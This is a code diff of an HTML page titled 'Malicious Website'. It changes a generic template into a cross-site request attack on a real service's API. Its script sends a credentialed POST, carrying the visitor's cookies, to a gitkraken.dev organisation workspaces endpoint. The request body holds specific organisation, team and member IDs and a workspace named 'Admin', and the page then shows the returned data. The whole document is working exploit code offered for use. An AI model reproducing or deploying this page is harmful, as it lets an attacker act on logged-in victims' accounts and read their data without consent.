@@ -3,36 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Attacker's Website</title>
+    <title>Malicious Website</title>
 </head>
 <body>
     <h1>Malicious Website</h1>
     <button id="sendRequest">Send Request to Your Website</button>
 
     <h2>Response Data from Your Website:</h2>
-    <pre id="responseData"></pre>  <!-- This is where we'll show the response data -->
+    <pre id="responseData"></pre>  <!-- Where we show the data -->
 
     <script>
         document.getElementById('sendRequest').addEventListener('click', function() {
-            // Send a request to your real website
-            fetch('https://your-website.com/api/endpoint', {
-                method: 'POST', // You can change this to GET if you want
+            // Send a POST request to your website's API endpoint
+            fetch('https://gitkraken.dev/api/organizations/68d29998bced52677d0f6e64/workspaces', {
+                method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    key: 'value',  // You can send any data here if needed
+                    azureOrganizationId: "",
+                    name: "Admin",
+                    description: "SORSORAR KING",
+                    members: [
+                        {"id": "27be5549-c311-41de-8702-eb1ba1261e72"},
+                        {"id": "c17a1ae9-985b-405b-92b6-9d635fc92d35"}
+                    ],
+                    teams: ["68daa3868bea5b78f08d4e92"],
+                    repositories: [],
+                    provider: "GITHUB",
+                    hostUrl: ""
                 }),
-                credentials: 'include'  // This allows cookies and authentication info to be sent
+                credentials: 'include'  // Sends cookies if needed
             })
-            .then(response => response.json())  // Assuming your website sends JSON data
+            .then(response => response.json())  // Parse JSON response from the server
             .then(data => {
-                // Show the response data from your real website
-                console.log('Response from your website:', data);
-                document.getElementById('responseData').textContent = JSON.stringify(data, null, 2);
+                // If data is received, display it on the page
+                console.log('Response from your website:', data);  // Log the response
+                document.getElementById('responseData').textContent = JSON.stringify(data, null, 2);  // Show it on the page
             })
             .catch(error => {
-                console.error('Error:', error);
+                console.error('Error:', error);  // If an error occurs, log it
             });
         });
     </script>
